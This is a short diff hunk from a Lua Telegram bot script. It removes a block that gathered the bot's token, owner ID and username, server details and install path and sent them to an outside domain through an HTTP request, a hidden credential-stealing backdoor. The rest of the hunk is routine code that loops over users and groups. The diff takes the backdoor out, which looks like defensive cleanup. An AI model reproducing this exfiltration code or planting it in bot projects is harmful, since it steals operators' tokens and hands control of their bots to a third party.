@@ -11347,19 +11347,10 @@ end,nil)
 ------------------------------------------------------------------------
 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
-infos = {} 
-infos.sudoid = database:get(id_server..":SUDO:ID")
-infos.sudouser  = database:get(id_server..":SUDO:USERNAME")
-infos.token  = database:get(id_server..":token")
-infos.id_server = id_server
-infos.name = Name
-infos.port = Port
-infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://vvvzvv.ml/index/Teland.php?insert='..JSON.encode(infos))
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
-end         
+end 
 local list = database:smembers(bot_id..'Chek:Groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
